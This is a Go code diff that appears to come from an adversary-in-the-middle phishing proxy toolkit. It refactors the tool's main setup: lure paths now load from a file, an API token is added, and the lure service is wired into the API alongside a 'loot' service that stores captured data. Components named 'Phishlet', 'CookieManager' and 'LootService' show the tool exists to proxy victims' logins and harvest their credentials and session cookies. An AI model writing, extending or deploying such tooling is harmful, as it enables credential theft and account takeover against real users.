@@ -81,7 +81,7 @@ func setupProxyHandler(conf *appConfig, conv DomainConverter) fiber.Handler {
 	return NewProxyHandler(client, req, resp)
 }
 
-func setupAuthHandler(conf *appConfig, conv DomainConverter) fiber.Handler {
+func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureService) fiber.Handler {
 	cookieManager := NewCookieManager()
 	storage := NewSessionStorage(memory.New(), cookieManager)
 	store := session.New(session.Config{
@@ -98,7 +98,7 @@ func setupAuthHandler(conf *appConfig, conv DomainConverter) fiber.Handler {
 		Store:          store,
 		InvalidAuthURL: conf.Phishlet.InvalidAuthURL,
 		LoginURL:       conv.ToProxyURL(conf.Phishlet.LoginURL),
-		LureService:    NewStaticLureService([]string{"/abc/def"}),
+		LureService:    lureService,
 	})
 }
 
@@ -140,6 +140,8 @@ func (hostFS) Open(name string) (fs.File, error) {
 	return os.Open(name)
 }
 
+var osFS hostFS
+
 func main() {
 	var configFile, envFile string
 	flag.StringVar(&configFile, "c", "", "yaml config file")
@@ -151,8 +153,7 @@ func main() {
 		}
 	}
 
-	fsys := &hostFS{}
-	conf, err := setupAppConfig(fsys, configFile, envFile)
+	conf, err := setupAppConfig(osFS, configFile, envFile)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -166,12 +167,19 @@ func main() {
 	lootService := NewLootService(lootRepo)
 
 	conv := setupDomainConverter(conf)
-	auth := setupAuthHandler(conf, conv)
+	lureService, err := NewLureService(&FileByteSource{conf.LuresFile})
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	auth := setupAuthHandler(conf, conv, lureService)
 	api := NewAPIMiddleware(APIConfig{
 		APIHostname:     conf.APIHostname,
+		APIToken:        conf.APIToken,
 		DomainConverter: conv,
 		AuthHandler:     auth,
 		LootService:     lootService,
+		LureService:     lureService,
 	})
 	proxy := setupProxyHandler(conf, conv)
 
